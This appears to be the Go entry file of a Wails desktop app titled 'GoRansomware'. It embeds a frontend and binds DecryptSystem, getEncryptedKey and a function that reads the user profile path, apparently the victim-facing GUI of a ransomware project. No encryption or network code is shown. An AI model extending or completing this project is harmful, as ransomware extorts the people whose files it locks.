package main

import (
	_ "embed"
	"os"

	"github.com/wailsapp/wails"
)

func basic() string {
	return "Hello World!"
}

func osEnvWrapper() string {
	return os.Getenv("USERPROFILE")
}

//go:embed frontend/dist/app.js
var js string

//go:embed frontend/dist/app.css
var css string

func main() {

	app := wails.CreateApp(&wails.AppConfig{
		Width:  1024,
		Height: 768,
		Title:  "GoRansomware",
		JS:     js,
		CSS:    css,
		Colour: "#131313",
	})
	app.Bind(DecryptSystem)
	app.Bind(osEnvWrapper)
	app.Bind(getEncryptedKey)
	app.Run()
}
